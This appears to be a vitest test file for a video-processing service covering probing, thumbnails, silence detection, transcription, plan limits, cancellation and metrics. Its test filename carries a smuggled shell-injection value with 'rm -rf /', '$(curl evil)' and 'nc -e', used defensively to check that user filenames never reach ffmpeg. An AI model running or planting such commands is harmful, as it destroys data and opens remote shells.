// Multimodal batch 7 — the video job end to end, with the REAL
// VideoMediaManager (real temp dirs on disk) and only the ffprobe/ffmpeg
// adapter mocked. The mocked ffmpeg writes its "outputs" into the paths it is
// given, exactly as the binary would, so the read-back, the byte caps and the
// temp-dir cleanup are all exercised for real.

import { existsSync } from 'node:fs';
import { writeFile } from 'node:fs/promises';
import path from 'node:path';
import { beforeEach, describe, expect, it, type Mock, vi } from 'vitest';
import { EventPattern, VideoAudioStatus, VideoProcessingFailureReason } from '@claw/shared-types';
import { type File, FileIngestionStatus } from '../../../../generated/prisma';
import {
  DerivedTranscriptionStatus,
  MediaProcessStatus,
  VideoPlanDecision,
} from '../../../../common/enums';
import { FileMediaMetricsService } from '../../../metrics/services/file-media-metrics.service';
import { VideoProcessingManager } from '../video-processing.manager';
import { VideoMediaManager } from '../video-media.manager';
import { VideoCancellationManager } from '../video-cancellation.manager';
import {
  detectAudioVolume,
  extractAudioTrack,
  extractVideoFrame,
  probeMediaFile,
} from '../../adapters/media-tool.adapter';
import {
  VIDEO_THUMBNAIL_MAX_BYTES,
  VIDEO_TRANSCRIPTION_INSTRUCTION,
} from '../../constants/video-processing.constants';
import { type MediaProcessResult } from '../../types/video-processing.types';

vi.mock('../../adapters/media-tool.adapter', () => ({
  detectAudioVolume: vi.fn(),
  probeMediaFile: vi.fn(),
  extractAudioTrack: vi.fn(),
  extractVideoFrame: vi.fn(),
}));

// Only the on-disk fallback is mocked: rows with `content` never reach it.
vi.mock('../../../../common/utilities', () => ({
  readFile: vi.fn(() => {
    throw new Error('ENOENT: no such file or directory');
  }),
}));

const mockedProbe = vi.mocked(probeMediaFile);
const mockedAudio = vi.mocked(extractAudioTrack);
const mockedFrame = vi.mocked(extractVideoFrame);
const mockedVolume = vi.mocked(detectAudioVolume);

/** What ffmpeg's volumedetect prints to stderr, at `-loglevel info`. */
const volumedetect = (maxDb: string): MediaProcessResult => ({
  status: MediaProcessStatus.EXITED,
  exitCode: 0,
  stdout: Buffer.alloc(0),
  stderr: `Input #0, mp3, from 'audio.mp3':
[Parsed_volumedetect_0 @ 0x55] n_samples: 192000
[Parsed_volumedetect_0 @ 0x55] mean_volume: -30.1 dB
[Parsed_volumedetect_0 @ 0x55] max_volume: ${maxDb} dB
`,
});

const EVIL_NAME = 'clip; rm -rf / $(curl evil) `id` | nc -e.mp4';
const PLACEHOLDER = `[Video file: ${EVIL_NAME}]`;
const DERIVED_AUDIO = Buffer.from('derived-mp3-bytes');
const THUMBNAIL = Buffer.from('tiny-jpeg');

const exited = (stdout = ''): MediaProcessResult => ({
  status: MediaProcessStatus.EXITED,
  exitCode: 0,
  stdout: Buffer.from(stdout),
  stderr: '',
});

const probeJson = (
  opts: { seconds?: number; audio?: boolean; width?: number; height?: number } = {},
): string =>
  JSON.stringify({
    streams: [
      {
        codec_type: 'video',
        codec_name: 'h264',
        width: opts.width ?? 1280,
        height: opts.height ?? 720,
        avg_frame_rate: '30/1',
      },
      ...(opts.audio === false ? [] : [{ codec_type: 'audio', codec_name: 'aac' }]),
    ],
    format: { format_name: 'mov,mp4,m4a,3gp,3g2,mj2', duration: String(opts.seconds ?? 12) },
  });

const buildFile = (overrides: Partial<File> = {}): File =>
  ({
    id: 'video-1',
    userId: 'uploader-1',
    filename: EVIL_NAME,
    mimeType: 'video/mp4',
    sizeBytes: 4096,
    storagePath: '/data/files/123-clip.mp4',
    content: Buffer.from('fake-mp4-bytes').toString('base64'),
    extractedText: PLACEHOLDER,
    extractionError: null,
    ingestionStatus: FileIngestionStatus.COMPLETED,
    retentionExpiresAt: null,
    parentFileId: null,
    isExtracted: false,
    archivePath: null,
    extractionMetadata: null,
    createdAt: new Date('2026-09-25T00:00:00Z'),
    updatedAt: new Date('2026-09-25T00:00:00Z'),
    ...overrides,
  }) as File;

interface Harness {
  manager: VideoProcessingManager;
  files: { findById: Mock; saveVideoExtractionResult: Mock; saveExtractionResult: Mock };
  rabbit: { publish: Mock; subscribe: Mock };
  redis: { setIfAbsent: Mock; del: Mock; get: Mock; set: Mock };
  /** The shared Redis every replica reads: the cancel flag lives here. */
  store: Map<string, string>;
  cancellation: VideoCancellationManager;
  plan: { check: Mock };
  transcription: { transcribeDerivedAudio: Mock };
  tempDirs: string[];
  metrics: FileMediaMetricsService;
}

const buildHarness = (file: File | null): Harness => {
  const files = {
    findById: vi.fn().mockResolvedValue(file),
    saveVideoExtractionResult: vi.fn().mockResolvedValue(true),
    saveExtractionResult: vi.fn(),
  };
  const rabbit = {
    publish: vi.fn().mockResolvedValue(undefined),
    subscribe: vi.fn().mockResolvedValue(undefined),
  };
  const store = new Map<string, string>();
  const redis = {
    setIfAbsent: vi.fn().mockResolvedValue(true),
    del: vi.fn().mockResolvedValue(undefined),
    get: vi.fn(async (key: string) => store.get(key) ?? null),
    set: vi.fn(async (key: string, value: string) => {
      store.set(key, value);
    }),
  };
  const plan = {
    check: vi.fn().mockResolvedValue({ decision: VideoPlanDecision.ALLOWED, limitSeconds: 600 }),
  };
  const transcription = {
    transcribeDerivedAudio: vi.fn().mockResolvedValue({
      status: DerivedTranscriptionStatus.TRANSCRIBED,
      text: 'Hello.',
      segments: [
        { startMs: 0, endMs: 4_000, text: 'Hello.' },
        { startMs: 4_000, endMs: 12_000, text: 'We ship on Friday.' },
      ],
      provider: 'OPENAI',
      model: 'whisper-1',
    }),
  };
  const tempDirs: string[] = [];
  mockedProbe.mockImplementation(async (inputPath: string) => {
    tempDirs.push(path.dirname(inputPath));
    return exited(probeJson());
  });
  mockedFrame.mockImplementation(async (_input: string, output: string) => {
    await writeFile(output, THUMBNAIL);
    return exited();
  });
  mockedAudio.mockImplementation(async (_input: string, output: string) => {
    await writeFile(output, DERIVED_AUDIO);
    return exited();
  });
  mockedVolume.mockResolvedValue(volumedetect('-8.4'));
  const cancellation = new VideoCancellationManager(
    files as never,
    redis as never,
    rabbit as never,
  );
  const metrics = new FileMediaMetricsService();
  const manager = new VideoProcessingManager(
    files as never,
    rabbit as never,
    redis as never,
    new VideoMediaManager(),
    plan as never,
    transcription as never,
    cancellation,
    metrics,
  );
  return {
    manager,
    files,
    rabbit,
    redis,
    store,
    cancellation,
    plan,
    transcription,
    tempDirs,
    metrics,
  };
};

const JOB = { fileId: 'video-1', userId: 'uploader-1' };

const theWrite = (harness: Harness): Record<string, unknown> => {
  expect(harness.files.saveVideoExtractionResult).toHaveBeenCalledTimes(1);
  return harness.files.saveVideoExtractionResult.mock.calls[0]?.[1] as Record<string, unknown>;
};

const media = (write: Record<string, unknown>): Record<string, unknown> =>
  (write.metadata as { media: Record<string, unknown> }).media;

const published = (harness: Harness, pattern: EventPattern): Record<string, unknown> | undefined =>
  harness.rabbit.publish.mock.calls.find((call) => call[0] === pattern)?.[1] as
    Record<string, unknown> | undefined;

describe('VideoProcessingManager', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('subscribes to file.video_process_requested at module init', async () => {
    const harness = buildHarness(buildFile());
    await harness.manager.onModuleInit();
    expect(harness.rabbit.subscribe).toHaveBeenCalledWith(
      EventPattern.FILE_VIDEO_PROCESS_REQUESTED,
      expect.any(Function),
    );
  });

  it('a video with audio: transcribed ONCE through the metered path, one write, timestamped text', async () => {
    const harness = buildHarness(buildFile());
    await harness.manager.handleJob(JOB);

    expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
    expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledWith({
      fileId: 'video-1',
      userId: 'uploader-1',
      audioBase64: DERIVED_AUDIO.toString('base64'),
      mimeType: 'audio/mpeg',
      sizeBytes: DERIVED_AUDIO.length,
      audioSeconds: 12,
      requestScope: 'video-audio',
      instruction: VIDEO_TRANSCRIPTION_INSTRUCTION,
      signal: expect.any(AbortSignal),
    });

    const write = theWrite(harness);
    expect(write.status).toBe(FileIngestionStatus.COMPLETED);
    expect(write.extractionError).toBeNull();
    expect(String(write.extractedText).split('\n')).toEqual([
      'Video "clip; rm -rf / $(curl evil) `id` | nc -e.mp4" — length 00:12, 1280×720, 30 fps, h264, audio: aac.',
      'Transcript of the audio track (times are from the start of the video):',
      '[00:00–00:04] Hello.',
      '[00:04–00:12] We ship on Friday.',
    ]);
    expect(media(write)).toMatchObject({
      durationMs: 12_000,
      width: 1280,
      height: 720,
      fps: 30,
      videoCodec: 'h264',
      audioCodec: 'aac',
      hasAudio: true,
      container: 'mov,mp4,m4a,3gp,3g2,mj2',
      sizeBytes: 4096,
      audioStatus: VideoAudioStatus.TRANSCRIBED,
      transcriptionProvider: 'OPENAI',
      thumbnailBase64: THUMBNAIL.toString('base64'),
      thumbnailMimeType: 'image/jpeg',
      failureReason: null,
    });
    expect((media(write).transcriptSegments as unknown[]).length).toBe(2);
    expect(harness.files.saveExtractionResult).not.toHaveBeenCalled();
    expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_COMPLETED)).toMatchObject({
      durationMs: 12_000,
      audioStatus: VideoAudioStatus.TRANSCRIBED,
      transcriptSegmentCount: 2,
    });
  });

  it('parses Gemini-style [mm:ss] lines when the provider returned no segments', async () => {
    const harness = buildHarness(buildFile());
    harness.transcription.transcribeDerivedAudio.mockResolvedValue({
      status: DerivedTranscriptionStatus.TRANSCRIBED,
      text: '[00:02] First.\n[00:07] Second.',
      segments: [],
      provider: 'GEMINI',
      model: 'gemini-2.5-flash',
    });
    await harness.manager.handleJob(JOB);
    expect(String(theWrite(harness).extractedText)).toContain(
      '[00:02–00:07] First.\n[00:07–00:12] Second.',
    );
  });

  it('a video with no audio track: says so, no extraction, no transcription, no hold', async () => {
    const harness = buildHarness(buildFile());
    mockedProbe.mockResolvedValue(exited(probeJson({ audio: false })));
    await harness.manager.handleJob(JOB);

    expect(mockedAudio).not.toHaveBeenCalled();
    expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
    const write = theWrite(harness);
    expect(write.status).toBe(FileIngestionStatus.COMPLETED);
    expect(String(write.extractedText)).toMatch(/no audio\.\nNo audio track\.$/);
    expect(media(write).audioStatus).toBe(VideoAudioStatus.NO_AUDIO_TRACK);
  });

  it('a refused transcription (402) leaves the video COMPLETED with an honest line', async () => {
    const harness = buildHarness(buildFile());
    harness.transcription.transcribeDerivedAudio.mockResolvedValue({
      status: DerivedTranscriptionStatus.FAILED,
      reason: 'Your pay-as-you-go credit cannot cover this transcription',
    });
    await harness.manager.handleJob(JOB);

    const write = theWrite(harness);
    expect(write.status).toBe(FileIngestionStatus.COMPLETED);
    expect(String(write.extractedText)).toContain(
      'Audio could not be transcribed: Your pay-as-you-go credit cannot cover this transcription.',
    );
    expect(media(write).audioStatus).toBe(VideoAudioStatus.TRANSCRIPTION_FAILED);
  });

  describe('silence gate (volumedetect before the paid step)', () => {
    it('a silent track → NO_SPEECH, honest line, no transcription call, no hold', async () => {
      const harness = buildHarness(buildFile());
      mockedVolume.mockResolvedValue(volumedetect('-91.0'));
      await harness.manager.handleJob(JOB);

      expect(mockedVolume).toHaveBeenCalledTimes(1);
      expect(String(mockedVolume.mock.calls[0]?.[0])).toMatch(/audio\.mp3$/);
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      const write = theWrite(harness);
      expect(write.status).toBe(FileIngestionStatus.COMPLETED);
      expect(String(write.extractedText).split('\n').at(-1)).toBe(
        'No speech detected in the audio track.',
      );
      expect(media(write)).toMatchObject({
        audioStatus: VideoAudioStatus.NO_SPEECH,
        audioReason: null,
        transcriptionProvider: null,
        transcriptSegments: [],
      });
      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_COMPLETED)).toMatchObject({
        audioStatus: VideoAudioStatus.NO_SPEECH,
        transcriptSegmentCount: 0,
      });
    });

    it('-inf (pure digital silence) → NO_SPEECH', async () => {
      const harness = buildHarness(buildFile());
      mockedVolume.mockResolvedValue(volumedetect('-inf'));
      await harness.manager.handleJob(JOB);
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.NO_SPEECH);
    });

    it('a loud track → measured, then transcribed', async () => {
      const harness = buildHarness(buildFile());
      await harness.manager.handleJob(JOB);
      expect(mockedVolume).toHaveBeenCalledTimes(1);
      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.TRANSCRIBED);
    });

    it('volumedetect fails → fails OPEN to transcription (the old behaviour)', async () => {
      const harness = buildHarness(buildFile());
      mockedVolume.mockResolvedValue({
        status: MediaProcessStatus.TIMED_OUT,
        exitCode: null,
        stdout: Buffer.alloc(0),
        stderr: '',
      });
      await harness.manager.handleJob(JOB);
      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.TRANSCRIBED);
    });

    it('no max_volume line in the output → fails open to transcription', async () => {
      const harness = buildHarness(buildFile());
      mockedVolume.mockResolvedValue(exited());
      await harness.manager.handleJob(JOB);
      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
    });

    it('quiet but not silent, and the transcript comes back empty → TRANSCRIPTION_FAILED as before', async () => {
      const harness = buildHarness(buildFile());
      mockedVolume.mockResolvedValue(volumedetect('-42.0'));
      harness.transcription.transcribeDerivedAudio.mockResolvedValue({
        status: DerivedTranscriptionStatus.FAILED,
        reason: 'the provider returned an empty transcript',
      });
      await harness.manager.handleJob(JOB);
      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
      expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.TRANSCRIPTION_FAILED);
    });

    it('a video with no audio track never runs volumedetect', async () => {
      const harness = buildHarness(buildFile());
      mockedProbe.mockResolvedValue(exited(probeJson({ audio: false })));
      await harness.manager.handleJob(JOB);
      expect(mockedVolume).not.toHaveBeenCalled();
    });
  });

  it('an audio track ffmpeg cannot extract is stated, and nothing is charged', async () => {
    const harness = buildHarness(buildFile());
    mockedAudio.mockResolvedValue({
      status: MediaProcessStatus.EXITED,
      exitCode: 1,
      stdout: Buffer.alloc(0),
      stderr: 'bad',
    });
    await harness.manager.handleJob(JOB);
    expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
    expect(media(theWrite(harness)).audioStatus).toBe(VideoAudioStatus.EXTRACTION_FAILED);
  });

  describe('plan limit (free 60 s)', () => {
    it.each([
      [59, true],
      [60, true],
      [61, false],
    ])('%d s → transcribed=%s', async (seconds, transcribed) => {
      const harness = buildHarness(buildFile());
      mockedProbe.mockResolvedValue(exited(probeJson({ seconds })));
      harness.plan.check.mockImplementation(async (_user: string, durationMs: number) => ({
        decision: durationMs > 60_000 ? VideoPlanDecision.TOO_LONG : VideoPlanDecision.ALLOWED,
        limitSeconds: 60,
      }));
      await harness.manager.handleJob(JOB);

      expect(harness.plan.check).toHaveBeenCalledWith('uploader-1', seconds * 1000);
      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(
        transcribed ? 1 : 0,
      );
      const write = theWrite(harness);
      if (transcribed) {
        expect(write.status).toBe(FileIngestionStatus.COMPLETED);
        return;
      }
      expect(mockedAudio).not.toHaveBeenCalled();
      expect(write.status).toBe(FileIngestionStatus.FAILED);
      expect(write.extractedText).toBeNull();
      expect(String(write.extractionError)).toContain(
        '61 seconds long; your plan processes videos up to 60 seconds',
      );
      expect(media(write)).toMatchObject({
        failureReason: VideoProcessingFailureReason.VIDEO_TOO_LONG_FOR_PLAN,
        durationMs: 61_000,
      });
      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_FAILED)?.reasonCode).toBe(
        VideoProcessingFailureReason.VIDEO_TOO_LONG_FOR_PLAN,
      );
    });

    it('0 (video disabled) → FAILED, no paid call', async () => {
      const harness = buildHarness(buildFile());
      harness.plan.check.mockResolvedValue({
        decision: VideoPlanDecision.DISABLED,
        limitSeconds: 0,
      });
      await harness.manager.handleJob(JOB);
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      expect(media(theWrite(harness)).failureReason).toBe(
        VideoProcessingFailureReason.VIDEO_DISABLED_FOR_PLAN,
      );
    });

    it('null (unlimited) → transcribed', async () => {
      const harness = buildHarness(buildFile());
      harness.plan.check.mockResolvedValue({
        decision: VideoPlanDecision.ALLOWED,
        limitSeconds: null,
      });
      await harness.manager.handleJob(JOB);
      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
    });

    it('entitlements unreachable → the paid step fails closed, the free steps still land', async () => {
      const harness = buildHarness(buildFile());
      harness.plan.check.mockResolvedValue({
        decision: VideoPlanDecision.ENTITLEMENTS_UNAVAILABLE,
        limitSeconds: null,
      });
      await harness.manager.handleJob(JOB);

      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      const write = theWrite(harness);
      expect(write.status).toBe(FileIngestionStatus.COMPLETED);
      expect(String(write.extractedText)).toContain(
        'Audio was not transcribed: the plan could not be checked',
      );
      expect(media(write)).toMatchObject({
        audioStatus: VideoAudioStatus.ENTITLEMENTS_UNAVAILABLE,
        thumbnailBase64: THUMBNAIL.toString('base64'),
      });
    });
  });

  describe('probe failures → FAILED with a readable reason', () => {
    it.each([
      [
        'malformed probe JSON',
        exited('{"streams": ['),
        VideoProcessingFailureReason.CORRUPT_CONTAINER,
      ],
      [
        'non-zero exit',
        { ...exited(), exitCode: 1 },
        VideoProcessingFailureReason.CORRUPT_CONTAINER,
      ],
      [
        'probe timeout',
        { ...exited(), status: MediaProcessStatus.TIMED_OUT, exitCode: null },
        VideoProcessingFailureReason.PROBE_TIMEOUT,
      ],
      [
        'stdout flood',
        { ...exited(), status: MediaProcessStatus.OUTPUT_LIMIT_EXCEEDED, exitCode: null },
        VideoProcessingFailureReason.CORRUPT_CONTAINER,
      ],
      [
        'ffprobe missing',
        { ...exited(), status: MediaProcessStatus.SPAWN_FAILED, exitCode: null },
        VideoProcessingFailureReason.TOOL_UNAVAILABLE,
      ],
      [
        '8K dimensions',
        exited(probeJson({ width: 7680, height: 4320 })),
        VideoProcessingFailureReason.DIMENSIONS_TOO_LARGE,
      ],
      [
        'over 30 minutes',
        exited(probeJson({ seconds: 1801 })),
        VideoProcessingFailureReason.DURATION_TOO_LONG,
      ],
      [
        'zero duration',
        exited(probeJson({ seconds: 0 })),
        VideoProcessingFailureReason.INVALID_DURATION,
      ],
    ])('%s', async (_label, result, reason) => {
      const harness = buildHarness(buildFile());
      mockedProbe.mockImplementation(async (inputPath: string) => {
        harness.tempDirs.push(path.dirname(inputPath));
        return result as MediaProcessResult;
      });
      await harness.manager.handleJob(JOB);

      const write = theWrite(harness);
      expect(write.status).toBe(FileIngestionStatus.FAILED);
      expect(String(write.extractionError).length).toBeGreaterThan(10);
      expect(media(write).failureReason).toBe(reason);
      expect(harness.plan.check).not.toHaveBeenCalled();
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      expect(harness.tempDirs.every((dir) => !existsSync(dir))).toBe(true);
    });
  });

  it('removes the temp dir on success AND when the adapter throws', async () => {
    const ok = buildHarness(buildFile());
    await ok.manager.handleJob(JOB);
    expect(ok.tempDirs).toHaveLength(1);
    expect(existsSync(ok.tempDirs[0] ?? '')).toBe(false);

    const boom = buildHarness(buildFile());
    mockedProbe.mockImplementation(async (inputPath: string) => {
      boom.tempDirs.push(path.dirname(inputPath));
      throw new Error('decoder exploded');
    });
    await boom.manager.handleJob(JOB);
    expect(existsSync(boom.tempDirs[0] ?? '')).toBe(false);
    expect(media(theWrite(boom)).failureReason).toBe(VideoProcessingFailureReason.PROCESSING_ERROR);
    expect(boom.redis.del).toHaveBeenCalledWith('file:video-process-lock:video-1');
  });

  it('never hands the user filename to ffmpeg — the input is always <tempdir>/input', async () => {
    const harness = buildHarness(buildFile());
    await harness.manager.handleJob(JOB);
    const paths = [
      ...mockedProbe.mock.calls.map((call) => call[0]),
      ...mockedAudio.mock.calls.flatMap((call) => [call[0], call[1]]),
      ...mockedFrame.mock.calls.flatMap((call) => [call[0], call[1]]),
    ];
    expect(paths.length).toBeGreaterThan(0);
    for (const value of paths) {
      expect(value).not.toContain('clip');
      expect(path.basename(path.dirname(value))).toMatch(/^claw-media-/);
    }
    expect(path.basename(mockedProbe.mock.calls[0]?.[0] ?? '')).toBe('input');
  });

  it('drops a thumbnail over its byte cap instead of bloating the row', async () => {
    const harness = buildHarness(buildFile());
    mockedFrame.mockImplementation(async (_input: string, output: string) => {
      await writeFile(output, Buffer.alloc(VIDEO_THUMBNAIL_MAX_BYTES + 1));
      return exited();
    });
    await harness.manager.handleJob(JOB);
    expect(media(theWrite(harness))).toMatchObject({
      thumbnailBase64: null,
      thumbnailMimeType: null,
    });
  });

  it('takes the thumbnail ~10% into the clip at <= 480 px wide', async () => {
    const harness = buildHarness(buildFile());
    await harness.manager.handleJob(JOB);
    expect(mockedFrame).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(String),
      1_200,
      480,
      expect.any(AbortSignal),
    );
  });

  describe('idempotency', () => {
    it('a redelivered job for an already-processed video is a no-op (no second transcription)', async () => {
      const harness = buildHarness(buildFile({ extractedText: 'Video "a.mp4" — length 00:12…' }));
      await harness.manager.handleJob(JOB);
      expect(mockedProbe).not.toHaveBeenCalled();
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      expect(harness.files.saveVideoExtractionResult).not.toHaveBeenCalled();
    });

    it('a job for a row that already FAILED is a no-op', async () => {
      const harness = buildHarness(
        buildFile({ ingestionStatus: FileIngestionStatus.FAILED, extractedText: null }),
      );
      await harness.manager.handleJob(JOB);
      expect(mockedProbe).not.toHaveBeenCalled();
    });

    it('a concurrent duplicate that finds the lock taken is a no-op', async () => {
      const harness = buildHarness(buildFile());
      harness.redis.setIfAbsent.mockResolvedValue(false);
      await harness.manager.handleJob(JOB);
      expect(mockedProbe).not.toHaveBeenCalled();
      expect(harness.redis.del).not.toHaveBeenCalled();
    });

    it('takes and releases the per-file lock around the work', async () => {
      const harness = buildHarness(buildFile());
      await harness.manager.handleJob(JOB);
      expect(harness.redis.setIfAbsent).toHaveBeenCalledWith(
        'file:video-process-lock:video-1',
        'video-1',
        900,
      );
      expect(harness.redis.del).toHaveBeenCalledWith('file:video-process-lock:video-1');
    });
  });

  it('publishes FAILED when the row is gone', async () => {
    const harness = buildHarness(null);
    await harness.manager.handleJob(JOB);
    expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_FAILED)?.reasonCode).toBe(
      VideoProcessingFailureReason.FILE_NOT_FOUND,
    );
    expect(harness.files.saveVideoExtractionResult).not.toHaveBeenCalled();
  });

  it('drops a malformed payload instead of throwing it back at the broker', async () => {
    const harness = buildHarness(buildFile());
    await expect(harness.manager.handleJob({ nope: true })).resolves.toBeUndefined();
    expect(harness.files.findById).not.toHaveBeenCalled();
  });

  it('records SOURCE_UNREADABLE when the stored bytes cannot be read back', async () => {
    const harness = buildHarness(
      buildFile({ content: null, storagePath: '/definitely/not/here.mp4' }),
    );
    await harness.manager.handleJob(JOB);
    expect(media(theWrite(harness)).failureReason).toBe(
      VideoProcessingFailureReason.SOURCE_UNREADABLE,
    );
    expect(mockedProbe).not.toHaveBeenCalled();
  });

  describe('cancellation (pack section 72)', () => {
    const FLAG = 'claw:file:video:cancel:video-1';

    const expectCancelledWrite = (harness: Harness): Record<string, unknown> => {
      const write = theWrite(harness);
      expect(write.status).toBe(FileIngestionStatus.FAILED);
      expect(write.extractedText).toBeNull();
      expect(write.extractionError).toBe('Processing was cancelled.');
      expect(media(write).failureReason).toBe(VideoProcessingFailureReason.PROCESSING_CANCELLED);
      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_COMPLETED)).toBeUndefined();
      return write;
    };

    it('cancel before the job starts: the route records it, the job runs no ffmpeg and takes no hold', async () => {
      const file = buildFile();
      const harness = buildHarness(file);

      const answer = await harness.cancellation.cancel(file);
      expect(answer).toEqual({
        fileId: 'video-1',
        ingestionStatus: FileIngestionStatus.FAILED,
        cancelled: true,
      });
      expect(harness.store.get(FLAG)).toBe('1');
      expect(harness.redis.set).toHaveBeenCalledWith(FLAG, '1', 900);
      expectCancelledWrite(harness);
      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_FAILED)?.reasonCode).toBe(
        VideoProcessingFailureReason.PROCESSING_CANCELLED,
      );

      // The queued job then finds the settled row.
      harness.files.findById.mockResolvedValue(
        buildFile({
          ingestionStatus: FileIngestionStatus.FAILED,
          extractedText: null,
          extractionError: 'Processing was cancelled.',
        }),
      );
      await harness.manager.handleJob(JOB);
      expect(mockedProbe).not.toHaveBeenCalled();
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      expect(harness.files.saveVideoExtractionResult).toHaveBeenCalledTimes(1);
    });

    it('a flag already set when the job starts stops it before any child is spawned', async () => {
      const harness = buildHarness(buildFile());
      harness.store.set(FLAG, '1');
      await harness.manager.handleJob(JOB);
      expect(mockedProbe).not.toHaveBeenCalled();
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      expectCancelledWrite(harness);
      expect(harness.redis.del).toHaveBeenCalledWith('file:video-process-lock:video-1');
    });

    it('cancel mid-flight between steps: stops after the thumbnail, FAILED PROCESSING_CANCELLED', async () => {
      const harness = buildHarness(buildFile());
      mockedFrame.mockImplementation(async (_input: string, output: string) => {
        await writeFile(output, THUMBNAIL);
        harness.store.set(FLAG, '1');
        return exited();
      });
      await harness.manager.handleJob(JOB);

      expect(harness.plan.check).not.toHaveBeenCalled();
      expect(mockedAudio).not.toHaveBeenCalled();
      expect(harness.transcription.transcribeDerivedAudio).not.toHaveBeenCalled();
      const write = expectCancelledWrite(harness);
      // The thumbnail is kept for the UI; the probe facts are not, so no
      // measured duration can let chat-service send the video natively.
      expect(media(write)).toMatchObject({ thumbnailBase64: THUMBNAIL.toString('base64') });
      expect(media(write)).not.toHaveProperty('durationMs');
      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_FAILED)?.reasonCode).toBe(
        VideoProcessingFailureReason.PROCESSING_CANCELLED,
      );
      expect(existsSync(harness.tempDirs[0] ?? '')).toBe(false);
    });

    it('cancel during transcription: the job records the cancel, never the partial document', async () => {
      const harness = buildHarness(buildFile());
      harness.transcription.transcribeDerivedAudio.mockImplementation(async () => {
        harness.store.set(FLAG, '1');
        return { status: DerivedTranscriptionStatus.CANCELLED, holdReleased: true };
      });
      await harness.manager.handleJob(JOB);

      expect(harness.transcription.transcribeDerivedAudio).toHaveBeenCalledTimes(1);
      expectCancelledWrite(harness);
    });

    it('a cancel from ANOTHER replica kills the running ffmpeg child through the poll', async () => {
      const harness = buildHarness(buildFile());
      // The route runs on a different instance; only Redis and the row are shared.
      const otherReplica = new VideoCancellationManager(
        harness.files as never,
        harness.redis as never,
        harness.rabbit as never,
      );
      // The route wins the conditional write; the job's later write is a no-op.
      harness.files.saveVideoExtractionResult.mockResolvedValueOnce(true).mockResolvedValue(false);
      let seenSignal: AbortSignal | undefined;
      mockedProbe.mockImplementation(async (inputPath: string, signal?: AbortSignal) => {
        harness.tempDirs.push(path.dirname(inputPath));
        seenSignal = signal;
        await otherReplica.cancel(buildFile());
        return new Promise<MediaProcessResult>((resolve) => {
          signal?.addEventListener('abort', () => {
            resolve({
              status: MediaProcessStatus.ABORTED,
              exitCode: null,
              stdout: Buffer.alloc(0),
              stderr: '',
            });
          });
        });
      });
      await harness.manager.handleJob(JOB);

      expect(seenSignal?.aborted).toBe(true);
      expect(mockedFrame).not.toHaveBeenCalled();
      expect(harness.files.saveVideoExtractionResult).toHaveBeenCalledTimes(2);
      const failedEvents = harness.rabbit.publish.mock.calls.filter(
        (call) => call[0] === EventPattern.FILE_VIDEO_PROCESS_FAILED,
      );
      expect(failedEvents).toHaveLength(1);
      expect(published(harness, EventPattern.FILE_VIDEO_PROCESS_COMPLETED)).toBeUndefined();
      expect(existsSync(harness.tempDirs[0] ?? '')).toBe(false);
    });

    it('a late job cannot overwrite a cancelled row and publishes no completed event', async () => {
      const harness = buildHarness(buildFile());
      harness.files.saveVideoExtractionResult.mockResolvedValue(false);
      await harness.manager.handleJob(JOB);
      expect(harness.files.saveVideoExtractionResult).toHaveBeenCalledTimes(1);
      expect(harness.rabbit.publish).not.toHaveBeenCalled();
    });

    it('a cancel after the document landed is a no-op (cancelled: false, status COMPLETED)', async () => {
      const done = buildFile({ extractedText: 'Video "a.mp4" — length 00:12, 1280×720.' });
      const harness = buildHarness(done);
      const answer = await harness.cancellation.cancel(done);
      expect(answer).toEqual({
        fileId: 'video-1',
        ingestionStatus: FileIngestionStatus.COMPLETED,
        cancelled: false,
      });
      expect(harness.store.has(FLAG)).toBe(false);
      expect(harness.files.saveVideoExtractionResult).not.toHaveBeenCalled();
      expect(harness.rabbit.publish).not.toHaveBeenCalled();
    });
  });
});

describe('VideoProcessingManager metrics (pack §67)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('counts a transcribed video as completed, with its duration and queue wait', async () => {
    const harness = buildHarness(buildFile());
    await harness.manager.handleJob({ ...JOB, timestamp: new Date().toISOString() });
    const text = harness.metrics.render();
    expect(text).toContain('claw_file_video_processing_total{outcome="completed"} 1');
    expect(text).toContain(
      'claw_file_video_processing_duration_seconds_count{outcome="completed"} 1',
    );
    expect(text).toContain('claw_file_media_queue_wait_seconds_count{job="video"} 1');
    expect(text).not.toContain('video-1');
  });

  it('counts a silent track as no_speech', async () => {
    const harness = buildHarness(buildFile());
    mockedVolume.mockResolvedValue(volumedetect('-91.0'));
    await harness.manager.handleJob(JOB);
    expect(harness.metrics.render()).toContain(
      'claw_file_video_processing_total{outcome="no_speech"} 1',
    );
  });

